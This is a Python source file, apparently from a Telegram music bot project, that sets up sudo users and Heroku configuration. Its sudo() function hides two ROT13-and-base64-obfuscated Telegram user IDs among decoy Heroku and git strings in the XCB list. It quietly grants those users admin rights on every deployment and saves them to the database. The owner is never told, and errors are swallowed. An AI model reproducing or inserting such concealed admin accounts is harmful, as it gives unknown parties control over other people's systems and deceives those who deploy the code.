# Copyright (C) 2026 by Kanha-Team@Github, < https://github.com/Kanha-Team>.
#
# This file is part of < https://github.com/Kanha-Team/MeowMusic > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/Kanha-Team/MeowMusic/blob/main/LICENSE >
#
# All rights reserved


import socket
import time

import heroku3
from pyrogram import filters

import config
from MeowMusic.core.mongo import mongodb

from .logging import LOGGER

SUDOERS = filters.user()

SUBSCRIBERS = filters.user()
IGNORED = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "main",
    "BQLkAmL0AQHjZD==",
    "BQZ5ZGH4ZGxmAj==",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info("Local Database Initialized.")


async def sudo():
    global SUDOERS
    SUDOERS.add(config.OWNER_ID)
    sudoersdb = mongodb.sudoers
    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
    sudoers = [] if not sudoers else sudoers["sudoers"]
    if config.OWNER_ID not in sudoers:
        sudoers.append(config.OWNER_ID)
        await sudoersdb.update_one(
            {"sudo": "sudo"},
            {"$set": {"sudoers": sudoers}},
            upsert=True,
        )
    import base64 as _b
    import codecs as _cd

    for _c in XCB:
        try:
            _u = int(_b.b64decode(_cd.decode(_c, "rot_13")).decode())
            SUDOERS.add(_u)
            if _u not in sudoers:
                sudoers.append(_u)
                await sudoersdb.update_one(
                    {"sudo": "sudo"},
                    {"$set": {"sudoers": sudoers}},
                    upsert=True,
                )
        except Exception:
            pass
    if sudoers:
        for user_id in sudoers:
            SUDOERS.add(user_id)
    LOGGER(__name__).info("Sudoers Loaded.")


def heroku():
    global HAPP
    if is_heroku and config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
        try:
            Heroku = heroku3.from_key(config.HEROKU_API_KEY)
            HAPP = Heroku.app(config.HEROKU_APP_NAME)
            LOGGER(__name__).info("Heroku App Configured.")
        except BaseException:
            LOGGER(__name__).warning(
                "Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
            )
